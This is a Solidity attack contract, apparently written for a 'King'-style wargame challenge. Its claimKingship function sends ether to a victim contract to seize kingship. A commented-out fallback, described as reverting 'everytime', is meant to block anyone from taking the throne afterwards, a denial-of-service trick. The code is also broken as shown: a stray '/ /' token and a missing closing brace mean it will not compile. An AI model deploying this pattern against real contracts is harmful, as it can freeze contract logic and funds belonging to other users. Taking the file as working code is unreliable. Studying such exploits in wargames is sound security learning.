// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract III237HackKing {
    function claimKingship(address payable _victim) public payable {
        (bool sent, ) = _victim.call{value:msg.value}("");
        require(sent, "Failed to send value!");
        
 / /fallback() external payable {  // fallback function that will revert everytime.
       // revert("look at me I'm the captain now");
}




